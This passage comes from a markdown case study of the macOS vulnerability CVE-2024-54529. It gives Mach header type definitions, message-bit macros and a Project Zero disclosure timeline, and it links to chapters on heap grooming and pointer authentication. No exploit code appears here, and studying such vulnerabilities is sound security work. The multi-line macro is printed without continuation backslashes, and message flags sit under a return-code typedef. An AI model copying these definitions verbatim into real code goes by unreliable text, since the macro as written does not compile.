| `CoreFoundation/CFPropertyList.h` | Plist serialization |

---

### P.2 Key Type Definitions

From `mach/port.h`:

```c
typedef natural_t mach_port_t;
typedef natural_t mach_port_name_t;

typedef int mach_port_right_t;
#define MACH_PORT_RIGHT_SEND         0
#define MACH_PORT_RIGHT_RECEIVE      1
#define MACH_PORT_RIGHT_SEND_ONCE    2
```

From `mach/kern_return.h`:

```c
typedef int kern_return_t;
#define KERN_SUCCESS                 0
#define KERN_INVALID_ADDRESS         1
#define KERN_PROTECTION_FAILURE      2
```

From `mach/message.h`:

```c
typedef int mach_msg_return_t;
#define MACH_MSG_SUCCESS             0
#define MACH_SEND_MSG               0x00000001
#define MACH_RCV_MSG                0x00000002
#define MACH_SEND_TIMEOUT           0x00000010
#define MACH_RCV_TIMEOUT            0x00000100
```

---

### P.3 Message Header Bits Macros

From `mach/message.h`:

```c
// Bit field layout
#define MACH_MSGH_BITS_REMOTE_MASK   0x0000001f
#define MACH_MSGH_BITS_LOCAL_MASK    0x00001f00
#define MACH_MSGH_BITS_VOUCHER_MASK  0x001f0000
#define MACH_MSGH_BITS_COMPLEX       0x80000000U

// Setter macro
#define MACH_MSGH_BITS_SET(remote, local, voucher, other)
    (MACH_MSGH_BITS_SET_PORTS((remote), (local), (voucher))
     | ((other) &~ MACH_MSGH_BITS_PORTS_MASK))

// Port right types for messages
#define MACH_MSG_TYPE_MOVE_RECEIVE   16
#define MACH_MSG_TYPE_MOVE_SEND      17
#define MACH_MSG_TYPE_MOVE_SEND_ONCE 18
#define MACH_MSG_TYPE_COPY_SEND      19
#define MACH_MSG_TYPE_MAKE_SEND      20
#define MACH_MSG_TYPE_MAKE_SEND_ONCE 21
```

---

## Security Research Context

### Responsible Disclosure

This vulnerability was discovered and reported responsibly:

| Field | Value |
|-------|-------|
| **Researcher** | Dillon Franke (Google Project Zero) |
| **Report Date** | October 9, 2024 |
| **Fix Date** | December 11, 2024 |
| **Disclosure** | January 7, 2025 (90-day policy) |

Project Zero follows a 90-day disclosure policy:
https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html

---

## Navigation

| Previous | Up | Next |
|----------|-----|------|
| [04-heap-grooming.md](04-heap-grooming.md) | [README.md](README.md) | [06-arm64-pac.md](06-arm64-pac.md) |

---

*This documentation is part of the CVE-2024-54529 case study. See [00-introduction.md](00-introduction.md) for an overview of all parts.*
